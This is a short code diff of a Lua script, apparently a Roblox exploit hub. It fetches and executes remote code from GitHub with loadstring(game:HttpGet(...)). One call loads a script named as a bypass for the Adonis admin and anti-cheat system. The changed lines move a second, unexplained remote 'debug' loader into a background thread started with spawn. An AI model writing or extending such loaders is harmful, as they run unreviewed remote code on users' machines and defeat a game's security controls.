@@ -26,4 +26,8 @@ if SETTINGS.safety.Bypassers == true then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/stuffman0001/CanHub-V2/refs/heads/main/Loader/Tests/Adonis%20Bypass.lua"))()
 end
 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/lowesky123/debug/refs/heads/main/start.lua"))()
+local function startdebug()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lowesky123/debug/refs/heads/main/start.lua"))()
+end
+			
+spawn(startdebug)
